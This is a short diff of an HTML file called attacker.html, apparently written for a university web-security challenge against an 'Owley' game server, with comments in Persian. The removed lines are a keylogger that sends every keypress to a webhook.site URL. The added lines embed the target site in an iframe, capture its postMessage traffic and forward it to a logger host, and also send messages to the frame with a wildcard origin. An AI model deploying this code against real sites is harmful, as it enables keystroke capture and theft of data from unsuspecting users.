@@ -1,15 +1,22 @@
+<!-- attacker.html -->
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>✅ Keylogger injected!</h3>
-    <script>
-      // آدرس Webhook سایت شما
-      const exfilUrl = "https://webhook.site/55bf6936-0070-47a1-b07d-8031aab7d4da";
+    <h1>Hacking Owley...</h1>
+    <iframe id="victim" src="https://gameserver.websec.saarland/owley" style="width:100%; height:500px;"></iframe>
 
-      // وقتی کلیدی فشرده میشه، به exfilUrl ارسال کن
-      document.addEventListener("keydown", function (e) {
-        fetch(`${exfilUrl}?key=${encodeURIComponent(e.key)}`);
+    <script>
+      // شنیدن پیام از iframe
+      window.addEventListener("message", function(event) {
+        console.log("[+] Got message from iframe:", event.data);
+        fetch("https://your-logger.com/log?data=" + encodeURIComponent(event.data));
       });
+
+      // ارسال پیام تست به iframe
+      setTimeout(() => {
+        document.getElementById("victim").contentWindow.postMessage("hi from attacker", "*");
+      }, 2000);
     </script>
   </body>
 </html>
+
